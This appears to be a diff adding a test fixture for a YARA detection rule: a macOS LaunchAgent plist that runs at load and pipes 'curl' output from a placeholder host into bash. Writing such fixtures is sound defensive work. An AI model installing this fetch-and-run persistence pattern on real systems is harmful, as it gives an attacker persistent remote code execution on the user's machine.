@@ -1,0 +1,16 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!-- Inert YARA fixture for CERBER_MacOS_LaunchAgent_Curl_Bash -->
+<plist version="1.0">
+<dict>
+    <key>Label</key>
+    <string>com.example.fixture</string>
+    <key>ProgramArguments</key>
+    <array>
+        <string>/bin/bash</string>
+        <string>-c</string>
+        <string>curl -s http://example.invalid/a.sh | bash</string>
+    </array>
+    <key>RunAtLoad</key>
+    <true/>
+</dict>
+</plist>
